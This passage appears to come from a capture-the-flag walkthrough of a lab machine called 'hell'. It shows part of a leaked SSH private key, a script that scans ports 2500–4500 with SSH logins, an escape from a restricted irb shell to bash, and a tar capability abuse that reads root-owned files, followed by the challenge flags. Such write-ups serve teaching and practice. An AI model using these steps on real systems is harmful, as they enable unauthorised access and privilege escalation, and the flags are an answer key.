DrmSK7T4wcXLDZAXyp7mh+yEZu/52ydQdRaV+gxZ9WonKOPLXhoGhzWOQGF/KVmAu+TNOY
6JKPu6Oz/5S40YEIy2XrXmBDgoGf9y95Jl2Uob/lUVjX8tyvXNLyeAy8v9hZl+84ueKZFS
LVxG02RMnoETg/kFS9JYCorwh70vALVAQSGRZrhvfON/FxAG6SUxKCemqfN7QlQ9TsBjUA
eHaPSP4q5PSQv8zT3RAAABACIWIAfzajXn5NcY5ft83Vnkspcbo4nNJKb8qIXTm4Ru2lS6
EqFDzgkjfJ1LasiPDU8dgc0EWRes2/4iDRsflc4PsftCw9fYC3Zyl7a/m92N9ZJnRdntq8
czc94vfkGQ+nqIW0Op7fdL/L90fR8aKTNL+3ubTd+QBvDKFDyVLZ1R2XmCJOn28pIVK+fE
2cgb6Mdlj9dBzUWFKobavSiJRW/eCUkN+oGT5bpOZQRZ6sS3vxXN5+Eo3BPBi4HJZRhOfy
Mn8jb4Rlppg0BSr4pw4mYygcMse0pi5mYRM6d3gckIdML++GyplbrQ1fvXo2AtHJ+gbWVb
x19z6r+wbd8iPEIAAAEBAPEcF5xodnLCu8035wbw3zLO6LrEQVKTt9/6Cga4XFqfEANcSj
ADEHAsTnek/la1evPxz+GWe68rxX4KdtvvcwKy0i1BzziKOmaE8I7r72awQEiwndg+th9A
IbVrwgVADoP77u8S/Rj46c7WUJa+KyMeTbKwqBWYHQVEIchO52EGFHD6oNX6xAMAksTw3/
j6BZc1z5q7sq4uxjowWDwI1HKAwg96SMXB1wkbgDNa9Lo/0cYcQP6MyERxpvfM1ZaPJw5S
k2TupiKspeRz2LU69Rjt7KhaM9WxNPXZXmjN1iVXwg9yfXEqCOVZ/FL1DL9OZyRQCmXEcZ
B5Z9g8OICwp2cAAAEBAMrFrOORG6bqgKFMUDSQ/lSMeYlVjw+dpvH5Tl5hc7fgXYKATj+Z
KTGGPOEoz/qYqp4TOvkKEi5J29kABSRyQR548V1YJvVM+EpggecQ6fbTKhJIlClpMS0Sck
hZBZbpdtHt5cN0aGw3+8zJ7/XPtV2K8wpP07FLPkSTyGJnZGX7iGzEcGm8CymiDrzBXhXw
RVWA4SAmsIh7/UbO6dtXNylszbJeCdE5Z3YH3eXQTci5D3jbwgMZg/Ns5VY0X329wfxWJu
3j2l9ErGukpoi1CIXkEpBOFUKsn7daOtSbyq3AQCwcEA6AfSY+jha6CdGRstceyyPdAqeI
xa0G3rSKDYMAAAAKaGFkZXNAaGVsbAE=
-----END OPENSSH PRIVATE KEY-----

┌──(root㉿kali)-[~/hell_thm/home/hades/.ssh]
└─# chmod 600 id_rsa

┌──(root㉿kali)-[~/hell_thm/home/hades/.ssh]
└─# cat ssh_knock.py 
#!/usr/bin/env python3

import os

rhost = '10.10.173.229'

for port in range(2500, 4500):
   os.system(f'ssh -i /root/hell_thm/home/hades/.ssh/id_rsa  hades@{rhost} -p {port}')

┌──(root㉿kali)-[~/hell_thm/home/hades/.ssh]
└─# python3 ssh_knock.py

Connection reset by 10.10.173.229 port 3332
The authenticity of host '[10.10.173.229]:3333 ([10.10.173.229]:3333)' can't be established.
ED25519 key fingerprint is SHA256:Zj1jn6b0042OHU6nvWMtd/PCNk57yPlHaXTatTQuKuQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.173.229]:3333' (ED25519) to the list of known hosts.

port 3333

┌──(root㉿kali)-[~/hell_thm/home/hades/.ssh]
└─# ssh -i id_rsa hades@10.10.173.229 -p3333

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

 ██░ ██ ▓█████  ██▓     ██▓    
▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
▒██▀▀██░▒███   ▒██░    ▒██░    
░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
░▓█▒░██▓░▒████▒░██████▒░██████▒
 ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
 ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
 ░  ░░ ░   ░     ░ ░     ░ ░   
 ░  ░  ░   ░  ░    ░  ░    ░  ░
                               
 Welcome to hell. We hope you enjoy your stay!
 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

 ██░ ██ ▓█████  ██▓     ██▓    
▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
▒██▀▀██░▒███   ▒██░    ▒██░    
░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
░▓█▒░██▓░▒████▒░██████▒░██████▒
 ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
 ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
 ░  ░░ ░   ░     ░ ░     ░ ░   
 ░  ░  ░   ░  ░    ░  ░    ░  ░
                               
 Welcome to hell. We hope you enjoy your stay!
 irb(main):001:0> ls
Traceback (most recent call last):
        2: from /usr/bin/irb:11:in `<main>'
        1: from (irb):1
NameError (undefined local variable or method `ls' for main:Object)

 irb(main):001:0> system("ls")
user.txt
=> true
irb(main):002:0> system("/bin/bash")
hades@hell:~$ id
uid=1002(hades) gid=1002(hades) groups=1002(hades)
hades@hell:~$ cat user.txt 
thm{sh3ll_3c4p3_15_v3ry_1337}

hades@hell:~$ getcap -r / 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
/bin/tar = cap_dac_read_search+ep

tar xf "$LFILE" -I '/bin/sh -c "cat 1>&2"'

hades@hell:~$ tar xf "/root/root.txt" -I '/bin/sh -c "cat 1>&2"'
thm{w0w_n1c3_3sc4l4t10n}

```

flag.txt

*thm{h0p3_y0u_l1k3d_th3_f1r3w4ll}*

user.txt

The fake ports aren't running real software...only the real one will respond to login attempts.

*thm{sh3ll_3c4p3_15_v3ry_1337}*
root.txt

getcap

*thm{w0w_n1c3_3sc4l4t10n}*

[[Racetrack Bank]]